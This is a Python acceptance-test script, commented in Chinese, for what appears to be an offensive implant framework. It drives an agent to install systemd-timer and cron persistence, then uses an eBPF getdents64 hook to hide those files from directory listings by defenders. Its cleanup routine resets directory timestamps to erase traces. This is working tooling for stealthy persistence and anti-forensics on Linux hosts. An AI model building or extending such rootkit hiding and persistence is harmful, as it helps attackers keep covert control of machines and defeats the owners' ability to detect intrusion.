#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""p19_g7_closure_verify.py — P6 / G7 闭环验收：持久化产物自动进 hide_names

方案 §5 遗留 · G7（完全体 D2）：`systemd_persist.c` 只在回执里**建议**操作员手工跑
`hide_add.o`，`cron_persist.c` 连提都没提。而落地物是**加载 eBPF 之后**才出现在磁盘
上的，`ebpf_load` 的 <names> 参数管不到 → 对手一条 `ls -la /etc/systemd/system/`
就看见复活层。

修法：把"写 hide_names"收敛成 agent core 的一份实现 `AxHideNameAdd(pin, name)`
（key 语义「64 字节定长、NUL 填充到满」一旦有第二份实现就会漂移，而漂移的表现是
**静默不隐藏**），持久化 BOF 调用它自动收尾。

断言设计要点：**阴性的"看不见"必须配一个"看得见"的阳性对照**（P5 的教训 —— 观测
手段坏了的时候，阴性断言会照样 PASS）。所以 T1 是"eBPF 未加载时产物看得见"。

  T1  对照 + 优雅降级：未加载 eBPF 时安装 → 回执 no-map，文件照装且 **listdir 看得见**
  T2  systemd_persist 自登记：回执里 service/timer 两个名字都是 ok
  T3  ★ 登记后 os.listdir **不再列出**单元文件（对手 `ls /etc/systemd/system` 的效果）
  T4  cron_persist 自登记：回执 ok + `/etc/cron.d/<job>` 不可见
  T5  ★ pin 名隐藏后仍能补写（AxSetBpfPin 的作用；也是"隐藏"与"补写"能共存的前提）
  T6  边界（INFO）：`open()`/`read()` 照样读得到 —— hide_names 只挡目录枚举（陷阱 1）
  T7  卸载后名字重新可见 → 证明是"**藏住了**"不是"删光了"；随后清干净（门 S1）

用法: p19_g7_closure_verify.py [--listener TestHTTP]
"""
import os
import struct
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e                                    # noqa: E402
import gap10_rootkit_verify as G              # noqa: E402  复用观测原语与 BOF 打包
import p21_pin_autohide_verify as p21         # noqa: E402  复用「按路径 stat / 元素计数」两个原语

PIN_H = "axg19h"                  # 只加载 hide 模块：它的 getdents64 过滤就是观测手段
CTL = "axg19ctl"                  # T5 阳性对照 map（bpftool map create 的无关 map）
UNIT = "axg19uat"                 # systemd 单元基名（唯一，绝不撞系统单元）
JOB, JOB2 = "axg19job", "axg19job2"

SYS_UNITDIR = "/etc/systemd/system"
SYS_WANTSDIR = SYS_UNITDIR + "/timers.target.wants"
CRONDIR = "/etc/cron.d"
UNIT_SVC = "%s/%s.service" % (SYS_UNITDIR, UNIT)
UNIT_TMR = "%s/%s.timer" % (SYS_UNITDIR, UNIT)
UNIT_LNK = "%s/%s.timer" % (SYS_WANTSDIR, UNIT)
CRON_F = "%s/%s" % (CRONDIR, JOB)
CRON_F2 = "%s/%s" % (CRONDIR, JOB2)

R = []


def rec(item, status, note=""):
    R.append((item, status, note))
    print("  [%-4s] %-46s %s" % (status, item, note), flush=True)


def blob(*fields):
    """参数 blob：[4B count][ (4B len + bytes)* ]（与 p03 / matrix_resolver.go 同款）。"""
    out = struct.pack("<I", len(fields))
    for f in fields:
        b = f.encode() if isinstance(f, str) else f
        out += struct.pack("<I", len(b)) + b
    return out


def visible(path, name):
    """os.listdir 走 getdents64 —— 与对手的 `ls` 是同一条路径，hide_names 对它生效。

    正面证据：p13 T4 观察到**同名** dirent 在 /tmp 也一起消失，说明过滤是按名字
    全局作用的，不是按目录或按进程。
    """
    try:
        return name in os.listdir(path)
    except OSError:
        return False


def rm_artifacts():
    for f in (UNIT_SVC, UNIT_TMR, UNIT_LNK, CRON_F, CRON_F2):
        try:
            os.unlink(f)
        except OSError:
            pass


def _dirstamp():
    out = {}
    for d in (SYS_UNITDIR, SYS_WANTSDIR, CRONDIR):
        try:
            st = os.stat(d)
            out[d] = (st.st_atime_ns, st.st_mtime_ns)
        except OSError:
            pass
    return out


def cleanup19(stamps, pid=None):
    """收尾。删 pin 同时走两条路（glob + 精确路径），原因见下面的注释 —— 只靠
    glob 的话，被 hide_names 藏起来的 `<pin>_map0` 会静默残留（门 S1 违例）。
    """
    if pid:
        try:
            os.kill(pid, 9)
        except OSError:
            pass
    rm_artifacts()
    try:
        os.unlink("/sys/fs/bpf/" + CTL)          # T5 的阳性对照 map
    except OSError:
        pass
    # 被 hide_names 藏住的 pin **在 shell glob 里展不开**（glob 走 getdents），
    # `rm -f /sys/fs/bpf/axg19*` 会把字面量原样交给 rm，`-f` 让它静默"成功"。
    # 所以除了 glob，还按**精确路径**删一遍 —— 路径查找（unlink）不过 getdents，
    # 名字被藏起来照样删得掉。T5 会主动把 <pin>_map0 藏起来，所以这条不是多余的。
    for suf in ["_prog", "_link"] + ["_map%d" % i for i in range(8)]:
        try:
            os.unlink("/sys/fs/bpf/" + PIN_H + suf)
        except OSError:
            pass
    G.sh("rm -f /sys/fs/bpf/axg19*")
    # 建/删文件会把目录 mtime 顶到"刚刚"，比文件本身显眼得多 —— 恢复原值。
    for d, (a, m) in (stamps or {}).items():
        try:
            os.utime(d, ns=(a, m))
        except OSError:
            pass


def main():
    argv = sys.argv[1:]
    listener = argv[argv.index("--listener") + 1] if "--listener" in argv else "TestHTTP"

    if not os.path.isdir("/sys/kernel/tracing/events/syscalls"):
        print("FATAL: /sys/kernel/tracing 未挂载")
        return 2
    if not os.path.isdir(SYS_WANTSDIR) or not os.path.isdir(CRONDIR):
        print("FATAL: %s / %s 不存在" % (SYS_WANTSDIR, CRONDIR))
        return 2

    stamps = _dirstamp()
    rm_artifacts()
    cleanup19(stamps)
    pid = aid = None
    try:
        binp = e2e.gen_agent(listener, "p19")
        pid = e2e.launch(binp)
        aid = e2e.wait_registered(listener, pid, timeout=90)
        print("[p19] agent id=%s pid=%s" % (aid, pid), flush=True)
        base_prog = G.prog_ids()

        # ── T1 阳性对照 + 优雅降级 ──────────────────────────────────────
        # eBPF 还没加载 → AxHideNameAdd 必然 -2。此时**必须**仍然把持久化装好：
        # "这次没藏住"不该让安装整体失败。同时这也是 T3 的阳性对照 —— 证明
        # os.listdir 这条观测路径本身是通的，否则 T3 的"看不见"毫无意义。
        G.send_bof(aid, "systemd_persist", blob("/bin/true", UNIT))
        ok1, _ = G.wait_tasks(aid, 1, 120, "T1")
        G.show_bof(aid, 2)
        t1 = "\n".join(G.bof_texts(aid, 2))
        svc_seen = visible(SYS_UNITDIR, UNIT + ".service")
        tmr_seen = visible(SYS_UNITDIR, UNIT + ".timer")
        rec("T1 对照 · 未载 eBPF 时安装成功且文件可见",
            "PASS" if (ok1 and "no-map" in t1 and svc_seen and tmr_seen) else "FAIL",
            "回执%s；listdir service=%s timer=%s（对照必须为 True）"
            % ("含 no-map" if "no-map" in t1 else "缺 no-map", svc_seen, tmr_seen))

        rm_artifacts()

        # ── 载入 hide：从此"看得见/看不见"才是有效观测 ──
        G.load(aid, "hide", 5, 1, "syscalls/sys_exit_getdents64", pin=PIN_H)
        okl, _ = G.wait_tasks(aid, 1, 120, "load")
        G.show_bof(aid, 1)
        if not okl:
            rec("T0 hide 模块加载", "FAIL", "观测手段没就位，后续断言无意义")
            raise SystemExit(1)
        print("[p19] hide 已加载（pin=%s）" % PIN_H, flush=True)

        # ── T2/T3 systemd_persist 自登记 ────────────────────────────────
        G.send_bof(aid, "systemd_persist", blob("/bin/true", UNIT))
        ok2, _ = G.wait_tasks(aid, 1, 120, "T2")
        G.show_bof(aid, 2)
        t2 = "\n".join(G.bof_texts(aid, 2))
        rec("T2 systemd_persist 回执 · 两个名字都自登记",
            "PASS" if (ok2 and "%s.service -> ok" % UNIT in t2
                       and "%s.timer -> ok" % UNIT in t2) else "FAIL",
            "回执%s" % ("含两个 ok" if "-> ok" in t2 else "未见 ok"))

        svc_seen = visible(SYS_UNITDIR, UNIT + ".service")
        tmr_seen = visible(SYS_UNITDIR, UNIT + ".timer")
        rec("T3 ★ 登记后 os.listdir 不再列出单元文件",
            "PASS" if (not svc_seen and not tmr_seen) else "FAIL",
            "service 可见=%s timer 可见=%s（修前恒为 True，即 `ls /etc/systemd/system` 直接暴露）"
            % (svc_seen, tmr_seen))
        rec("T3b 单元文件在磁盘上仍然存在（藏住了 ≠ 删光了）",
            "PASS" if os.path.exists(UNIT_SVC) and os.path.exists(UNIT_TMR) else "FAIL",
            "exists(svc)=%s exists(tmr)=%s" % (os.path.exists(UNIT_SVC), os.path.exists(UNIT_TMR)))

        # ── T4 cron_persist 自登记 ──────────────────────────────────────
        G.send_bof(aid, "cron_persist", blob("/bin/true", JOB))
        ok4, _ = G.wait_tasks(aid, 1, 120, "T4")
        G.show_bof(aid, 2)
        t4 = "\n".join(G.bof_texts(aid, 2))
        job_seen = visible(CRONDIR, JOB)
        rec("T4 cron_persist 自登记 + /etc/cron.d 不可见",
            "PASS" if (ok4 and "%s -> ok" % JOB in t4 and not job_seen
                       and os.path.exists(CRON_F)) else "FAIL",
            "回执%s；listdir 可见=%s exists=%s"
            % ("ok" if "-> ok" in t4 else "未见 ok", job_seen, os.path.exists(CRON_F)))

        # ── T5 ★ pin 名被自己隐藏后，仍能补写 ───────────────────────────
        # ⚠ P8 之后这条判据的**原形态被掏空**：pin 名由 ebpf_load §6c 自动隐藏
        # → 旧判据里的 `not pin_seen` **恒真**，测试还在 PASS 却什么都不测了。
        # 这不是判据写错，是**被测对象变了**（P8 §5.2 记的就是这一条）。
        # 重写成三步，每一步都可证伪：
        #   ① CTL 是这个目录里的**阳性对照** —— 先证明 `ls` 真的列得出东西，
        #      否则"pin 看不见"可能只是"目录本来就空"；
        #   ② pin 文件**按路径**仍在（stat 走 sys_newlstat，不走 getdents）
        #      —— 这才是"隐藏 ≠ 不可用"的实证；
        #   ③ hide_names 的**元素数差值** +1 —— 补写的证据，不信回执信读数。
        p21.make_ctl(CTL)
        ctl_seen = visible("/sys/fs/bpf", CTL)
        pin_on_disk = os.path.exists("/sys/fs/bpf/%s_map0" % PIN_H)
        k_before = p21.hide_keys(PIN_H)
        G.send_bof(aid, "hide_add", blob(PIN_H, CTL))
        okh, _ = G.wait_tasks(aid, 1, 120, "hide-pin")
        G.show_bof(aid, 2)
        k_after = p21.hide_keys(PIN_H)
        ctl_gone = not visible("/sys/fs/bpf", CTL)
        G.send_bof(aid, "cron_persist", blob("/bin/true", JOB2))
        ok5, _ = G.wait_tasks(aid, 1, 120, "T5")
        G.show_bof(aid, 2)
        t5 = "\n".join(G.bof_texts(aid, 2))
        rec("T5 ★ pin 名隐藏后仍能补写 hide_names",
            "PASS" if (okh and ctl_seen and pin_on_disk and ctl_gone
                       and k_after == k_before + 1 and ok5
                       and "%s -> ok" % JOB2 in t5
                       and not visible(CRONDIR, JOB2)) else "FAIL",
            "对照可见=%s→藏住=%s；pin 按路径仍在=%s；hide_names %d→%d；二次回执%s"
            % (ctl_seen, ctl_gone, pin_on_disk, k_before, k_after,
               "ok" if "-> ok" in t5 else "未见 ok"))

        # ── T6 边界（INFO，非判据）──────────────────────────────────────
        try:
            body = open(CRON_F, "rb").read()
            rd = b"/bin/true" in body
        except OSError:
            rd = False
        rec("T6 边界 · open()/read() 照样读得到（陷阱 1，固有）",
            "INFO", "直读 cron 文件=%s —— hide_names 只挡目录枚举，不挡内容读取" % rd)

        # ── T7 卸载后重新可见 ───────────────────────────────────────────
        G.send_bof(aid, "ebpf_unload", G.pack_unload(PIN_H))
        G.wait_tasks(aid, 1, 120, "unload")
        G.show_bof(aid, 1)
        fin = G.poll_until(G.prog_ids, lambda v: v <= base_prog, timeout=20)
        back = visible(SYS_UNITDIR, UNIT + ".service") and visible(CRONDIR, JOB)
        rec("T7 卸载后名字重新可见 + prog 回落基线",
            "PASS" if (back and fin <= base_prog) else "FAIL",
            "可见恢复=%s；残留 prog=%s" % (back, sorted(fin - base_prog)))

        os.kill(pid, 9)
        pid = None
        time.sleep(2)
    finally:
        cleanup19(stamps, pid)

    print("\n===== p19 结果 =====")
    for it, st, nt in R:
        print("  %-4s %s" % (st, it))
    npass = sum(1 for _, s, _ in R if s == "PASS")
    nfail = sum(1 for _, s, _ in R if s == "FAIL")
    print("PASS=%d FAIL=%d" % (npass, nfail))
    print("RESULT: %s" % ("PASS" if nfail == 0 else "FAIL"))
    return 0 if nfail == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
